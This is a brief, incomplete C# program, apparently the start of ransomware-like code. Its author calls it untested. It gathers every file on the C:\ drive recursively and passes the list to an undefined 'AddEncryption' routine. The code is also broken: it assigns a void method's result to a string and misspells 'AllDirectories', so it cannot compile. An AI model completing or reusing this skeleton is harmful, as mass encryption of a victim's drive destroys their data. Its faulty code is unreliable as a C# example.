//by the way I havent tested or debugged this or anything yet, so if it doesn't work for you, don't be mad at me.

using System;
using System.Security.Cryptography;
using System.IO;
using System.Security.AccessControl;

namespace fileSystem {
	class crypto {
		public static void fileEnum() {
			string[] files = Directory.GetFiles(@"C:\\", "*.*", SearchOption.AllDirectorys);
		}
		
		public static void Main() {
			try {
				string filename = fileEnum();
				
				AddEncryption(filename);
			}
			
			catch (Exception e) {
				Console.WriteLine(e);
			}
			
			Console.ReadLine();
		}
	}
}
